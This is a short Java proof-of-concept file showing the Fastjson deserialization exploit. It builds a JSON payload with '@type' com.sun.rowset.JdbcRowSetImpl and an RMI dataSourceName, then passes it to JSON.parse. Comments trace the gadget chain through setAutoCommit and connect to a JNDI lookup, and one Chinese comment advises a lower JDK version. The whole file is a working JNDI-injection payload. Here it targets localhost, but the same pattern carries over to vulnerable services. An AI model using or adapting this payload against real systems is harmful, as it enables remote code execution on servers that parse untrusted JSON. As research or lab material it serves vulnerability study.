package jdbcrowsetimpl;

import com.alibaba.fastjson.JSON;

public class FJPoC {
    // 记得jdk版本低一点
    public static void main(String[] args) throws Exception {
        String PoC = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"rmi://127.0.0.1:1099/refObj\", \"autoCommit\":true}";
        // com.sun.rowset.JdbcRowSetImpl.setAutoCommit()
        //  com.sun.rowset.JdbcRowSetImpl.connect()
        //   var1.lookup(this.getDataSourceName());
        JSON.parse(PoC);
    }
}